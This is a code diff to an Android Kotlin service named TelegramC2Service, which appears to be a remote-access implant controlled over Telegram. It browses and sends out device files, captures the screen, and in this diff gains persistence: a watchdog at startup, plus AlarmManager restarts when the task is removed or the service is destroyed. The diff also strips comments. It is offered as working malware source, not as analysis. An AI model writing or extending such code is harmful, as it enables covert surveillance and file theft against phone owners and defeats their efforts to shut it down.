@@ -10,6 +10,7 @@ import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.os.SystemClock
 import android.util.Base64
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
@@ -60,7 +61,7 @@ class TelegramC2Service : Service() {
     @Volatile private var lastError: String = ""
 
     // Files browser state
-    private val pathRegistry = ConcurrentHashMap<String, String>()   // short_id -> real path
+    private val pathRegistry = ConcurrentHashMap<String, String>()
     private val idGen = AtomicLong(1000)
     @Volatile private var currentBrowsePath: String = "/sdcard"
     @Volatile private var currentBrowsePage: Int = 0
@@ -71,11 +72,9 @@ class TelegramC2Service : Service() {
     }
 
     private fun shortId(path: String): String {
-        // Reuse existing id if path is already registered
         pathRegistry.entries.firstOrNull { it.value == path }?.let { return it.key }
         val id = "p${idGen.incrementAndGet()}"
         pathRegistry[id] = path
-        // Trim registry if too large
         if (pathRegistry.size > 2000) {
             val keys = pathRegistry.keys.take(500)
             keys.forEach { pathRegistry.remove(it) }
@@ -108,6 +107,9 @@ class TelegramC2Service : Service() {
         }
         scope.launch { pollLoop() }
         scope.launch { autoRefreshLoop() }
+
+        // Ensure watchdog is armed
+        WatchdogReceiver.schedule(this)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -302,7 +304,6 @@ class TelegramC2Service : Service() {
                 else -> "application/octet-stream"
             }
 
-            // Images: send as photo preview
             if (mime.startsWith("image/") && bytes.size < 8 * 1024 * 1024) {
                 sendPhoto(file.name, bytes, caption)
                 return
@@ -620,7 +621,7 @@ class TelegramC2Service : Service() {
         if (!dir.exists() || !dir.isDirectory) return emptyList()
         val files = dir.listFiles() ?: return emptyList()
         return files
-            .filter { !it.name.startsWith(".") }   // hide hidden files
+            .filter { !it.name.startsWith(".") }
             .map { FileEntry(it.name, it.absolutePath, it.isDirectory, it.length(), it.lastModified()) }
             .sortedWith(compareByDescending<FileEntry> { it.isDir }.thenBy { it.name.lowercase() })
     }
@@ -646,7 +647,6 @@ class TelegramC2Service : Service() {
 
         val rows = JSONArray()
 
-        // Each file on its own row with a small icon
         for (e in slice) {
             val icon = iconFor(e.name, e.isDir)
             val label = if (e.isDir) {
@@ -662,7 +662,6 @@ class TelegramC2Service : Service() {
             })
         }
 
-        // Pagination row
         if (totalPages > 1) {
             rows.put(JSONArray().apply {
                 if (safePage > 0) {
@@ -678,7 +677,6 @@ class TelegramC2Service : Service() {
             })
         }
 
-        // Navigation row
         rows.put(JSONArray().apply {
             val parent = File(path).parent
             if (parent != null && path != "/") {
@@ -879,7 +877,6 @@ class TelegramC2Service : Service() {
             }
 
             "fb" -> {
-                // Files browser actions
                 val op = parts.getOrNull(1) ?: return
                 val arg = parts.getOrNull(2) ?: ""
                 when (op) {
@@ -1178,13 +1175,46 @@ class TelegramC2Service : Service() {
         }
     }
 
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        log("onTaskRemoved — scheduling restart")
+        try {
+            val restart = Intent(applicationContext, TelegramC2Service::class.java)
+            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            else PendingIntent.FLAG_UPDATE_CURRENT
+            val pi = PendingIntent.getService(applicationContext, 0xC3, restart, flags)
+            val am = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+            am.set(
+                android.app.AlarmManager.ELAPSED_REALTIME,
+                SystemClock.elapsedRealtime() + 2000,
+                pi
+            )
+        } catch (_: Exception) {}
+        super.onTaskRemoved(rootIntent)
+    }
+
     override fun onDestroy() {
-        log("onDestroy")
+        log("onDestroy — scheduling watchdog restart")
         captureSession?.release()
         captureSession = null
         try { projection?.stop() } catch (_: Exception) {}
         projection = null
         scope.cancel()
+
+        try {
+            val restart = Intent(applicationContext, TelegramC2Service::class.java)
+            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            else PendingIntent.FLAG_UPDATE_CURRENT
+            val pi = PendingIntent.getService(applicationContext, 0xC3, restart, flags)
+            val am = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+            am.set(
+                android.app.AlarmManager.ELAPSED_REALTIME,
+                SystemClock.elapsedRealtime() + 5000,
+                pi
+            )
+        } catch (_: Exception) {}
+
         super.onDestroy()
     }
 }
